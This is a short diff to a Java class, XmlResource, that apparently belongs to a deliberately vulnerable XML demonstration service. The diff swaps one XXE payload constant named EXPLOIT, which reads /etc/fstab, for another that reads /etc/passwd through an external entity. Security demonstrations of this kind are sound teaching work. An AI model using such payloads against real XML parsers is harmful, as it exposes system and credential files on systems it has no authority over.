@@ -30,15 +30,9 @@ public class XmlResource {
     private static final String FEATURE_PARAMETER_ENTITIES = "http://xml.org/sax/features/external-parameter-entities";
     private static final String DEMO = "<?xml version=\"1.0\" encoding=\"ascii\"?><!DOCTYPE foo [<!ELEMENT foo ANY >]><foo>demo</foo>";
 
-    private static final String EXPLOIT = "<?xml version=\"1.0\" encoding=\"ascii\"?>" +
-            "<!DOCTYPE foo [\n" +
-            "  <!ELEMENT foo ANY>\n" +
-            "  <!ENTITY bar SYSTEM\n" +
-            "  \"file:///etc/fstab\">;\n" +
-            "]>\n" +
-            "<foo>\n" +
-            "  &bar;\n" +
-            "</foo>";
+    private static final String EXPLOIT = "<?xml version=\"1.0\"?>\n" +
+            "<!DOCTYPE name [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>\n" +
+            "<name>&x;</name>";
 
     @GET
     public Response handle(@QueryParam("input") String input) throws ParserConfigurationException, IOException, TransformerException {
